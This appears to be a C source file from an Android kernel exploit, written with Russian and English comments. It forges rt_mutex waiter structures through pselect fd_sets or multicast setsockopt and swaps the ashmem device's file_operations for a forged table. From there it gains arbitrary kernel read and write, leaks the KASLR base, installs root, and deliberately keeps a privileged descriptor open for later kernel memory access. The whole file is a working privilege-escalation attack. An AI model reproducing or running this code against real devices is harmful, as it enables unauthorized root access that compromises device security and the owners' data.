#include "common.h"

/* Upstream-значение: 24 CFI-этапа на попытку. Сравнение с оригиналом
 * (boxiaolanya2008) показало: спрей идентичен, а «бешеную нагрузку»
 * создавал наш множитель попыток — каждый полный прогон заново гоняет
 * KernelSnitch-спрей (сотни форков). Пыток мало, этапов много. */
#define PSELECT_CFI_ROUTE_ATTEMPTS 24

atomic_int cfi_stage_done;
/* Privileged ashmem fd whose f_op still points at the forged configfs-backed
 * fops table. Kept open (not restored/closed) so the app can keep doing
 * arbitrary kernel memory reads/writes after the exploit finishes. */
int kernel_rw_fd = -1;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
int rmv_log_fd = -1;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  /* NEO11_ROUTE_DELAY_USEC: fixed punch delay applied to every attempt.
   * Unset (-1) keeps the rotating delays[] schedule. */
  static int env_delay = -1;
  if (env_delay < 0) {
    env_delay = env_int_range("NEO11_ROUTE_DELAY_USEC", -1, 0, 10000000);
  }
  if (env_delay >= 0) {
    return env_delay;
  }

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

static int route_timeout_sec(void) {
  static int v = -1;
  if (v < 0) {
    v = env_int_range("NEO11_TIMEOUT_SEC", PSELECT_TIMEOUT_SEC, 1, 120);
  }
  return v;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  /* dup2 ВСЕ fd (фиксированный тайминг входа в pselect + валидность
   * любого бита bitmap-слов) и filler fd >= NFDS+8 (core_sys_select
   * берёт n = min(nfds, fdtable->max_fds); без filler'а размер fdset в
   * стеке ядра уезжает и окно наложения съезжает). Размечено в
   * ghostlock-x200-root 1.3.5, зеркально slide-стадии. */
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    dup2(high_write, fd);
  }
  close(high_write);
  if (rmv_log_fd >= 0) {
    dup2(rmv_log_fd, STDOUT_FILENO);
    dup2(rmv_log_fd, STDERR_FILENO);
  }
  int filler = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 8);
  pr_info("fops filler_fd=%d errno=%d (max_fds >= %d)\n", filler, errno,
          PSELECT_ROUTE_NFDS + 8);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  /* Сдвиг fops-стадии: per-target (WAITER_WORD_SHIFT) или рантайм
   * RMV_FOPS_SHIFT=N — подбор на устройстве без пересборки */
  static int shift = -100;
  if (shift == -100) {
    shift = WAITER_WORD_SHIFT;
    const char *env = getenv("RMV_FOPS_SHIFT");
    if (env && *env) {
      int n = atoi(env);
      if (n >= -14 && n <= 14) shift = n;
    }
  }

  int words_per_set =
      (PSELECT_ROUTE_NFDS + (int)(8 * sizeof(unsigned long)) - 1) /
      (int)(8 * sizeof(unsigned long));

  /* Пишем слово по ГЛОБАЛЬНОЙ позиции: in = слова 0..wps-1,
   * out = wps..2*wps-1, ex = 2*wps..3*wps-1. Сдвиг может увести
   * слово в соседнее множество — поэтому только глобальная адресация. */
  fd_set *sets[3] = {in, out, ex};
  int rel[5];
  uint64_t val[5];
  int n;
  if (!WAITER_COMPACT) {
    /* Вложенный waiter (6.6 android15-8): w0 в tree_pc(+0), task@+10,
     * lock@+11. wake_state/ww_ctx/pad (12..14) — fake_lock: при дрейфе
     * chain-walk читает lock на смещённой позиции и обязан видеть
     * unlocked+пустое дерево (0/3/мусор тут = trylock(мусор) panic,
     * размечено в ghostlock-x200-root 1.3.5). */
    rel[0] = 0;  val[0] = fake_w0;
    rel[1] = 10; val[1] = text_addr(INIT_TASK);
    rel[2] = 11; val[2] = fake_lock;
    rel[3] = 12; val[3] = fake_lock;
    rel[4] = 13; val[4] = fake_lock;
    n = 5;
    int extra = 14;
    int g14 = shift + extra;
    if (g14 >= 0 && g14 / words_per_set <= 2) {
      int set_idx = g14 / words_per_set;
      int word_idx = g14 % words_per_set;
      fdset_put_word(sets[set_idx], word_idx, fake_lock);
    }
  } else {
    /* Компактный waiter (5.10/6.1): tree_pc@+0, pi@+3..5, task@+6,
     * lock@+7, prio@+8, deadline@+9 (prio/deadline остаются нулями). */
    rel[0] = 0;  val[0] = fake_w0;
    rel[1] = 6;  val[1] = text_addr(INIT_TASK);
    rel[2] = 7;  val[2] = fake_lock;
    n = 3;
  }
  for (int i = 0; i < n; i++) {
    int g = shift + rel[i];
    if (g < 0) continue;
    int set_idx = g / words_per_set;
    int word_idx = g % words_per_set;
    if (set_idx > 2) continue;
    fdset_put_word(sets[set_idx], word_idx, val[i]);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  static int max_attempts = -1;
  if (max_attempts < 0) {
    max_attempts =
      env_int_range("NEO11_CFI_ATTEMPTS", PSELECT_CFI_ROUTE_ATTEMPTS, 1, 1000);
  }
  for (int route_attempt = 1; route_attempt <= max_attempts;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = route_timeout_sec(),
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, max_attempts, cfi_last_step,
            cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

#ifdef MCAST_WAITER_OFF
/* MCAST-вариант fake-lock маршрута: та же подмена waiter'а, но копия
 * ложится setsockopt'ом (см. common.h/slide.c), а не fd_set pselect.
 * Форма компактного waiter'а 6.1 — как в prepare_pselect_fdsets
 * (tree_pc=fake_w0, task=text_addr(INIT_TASK), lock=fake_lock), плюс
 * wake_state=3/prio=140 из верифицированной kit-карты. В отличие от
 * pselect-версии при миссе НЕ прерываемся: переотравление дешёвое,
 * окно — вокруг самого setsockopt. */
void do_mcast_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("mcast route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int msock = mcast_open_sock();
  if (msock < 0) {
    cfi_last_step = 36;
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
  static int max_attempts = -1;
  if (max_attempts < 0) {
    max_attempts =
      env_int_range("RMV_MCAST_CFI_ATTEMPTS", MCAST_ROUTE_ATTEMPTS, 1, 2000);
  }
  unsigned char buf[MCAST_BUF_LEN];
  for (int route_attempt = 1; route_attempt <= max_attempts;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("mcast retry page prepare failed attempt=%d base=%016zx\n",
                 route_attempt, page_base);
        break;
      }
    }

    mcast_put_waiter(buf, fake_w0, 0, fake_w0, 0,
                     text_addr(INIT_TASK), fake_lock, 3, MCAST_WAITER_PRIO);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = atomic_load(&main_route_delay_usec);
    if (delay_usec > 2000) {
      delay_usec = 2000; /* MCAST-окно короткое: sched должен попасть сразу */
    }
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    int e = mcast_poison(msock, buf);
    if (e != EADDRNOTAVAIL) {
      cfi_last_step = 37;
      cfi_last_errno = e;
      pr_error("mcast route attempt=%d errno=%d — транспорта нет, стоп\n",
               route_attempt, e);
      atomic_store(&punch_consume_go, 0);
      break;
    }
    /* consumer_thread сам обнуляет go после CONSUMER_MAX_CALLS;
     * ждём импульс с предохранителем. */
    int guard = 0;
    while (atomic_load(&punch_consume_go) != 0 && guard < 20000) {
      usleep(10);
      guard++;
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("mcast attempt=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, e, calls, success, delay_usec);

    if (calls > 0 && success > 0) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    } else {
      cfi_last_step = 33;
      cfi_last_errno = e;
    }

    if (route_verified || cfi_dirty_seen) {
      break;
    }
  }
  close(msock);
  pr_info("mcast route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}
#endif /* MCAST_WAITER_OFF */

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr) ||
      !is_kernel_ptr(kaslr_show_fdinfo_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release ||
      kaslr_show_fdinfo_ptr != kaslr_expected_show_fdinfo) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  return install_pipe_physrw(fd) && install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    return 0;
  }

  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
  uint64_t pre_fops = 0;
  ssize_t pre_rb = configfs_read_once(
      fd, misc_fops, &pre_fops, sizeof(pre_fops));
  if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
    fops_before = pre_fops;
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    /* Keep the privileged fd open for later kernel reads/writes. The misc fops
     * has already been restored at the canonical address, but THIS fd's f_op
     * still points at the forged table, so configfs_read_once/write_once and
     * the pipe primitives stay usable. */
    kernel_rw_fd = fd;
    return 1;
  }
  SYSCHK(close(fd));
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
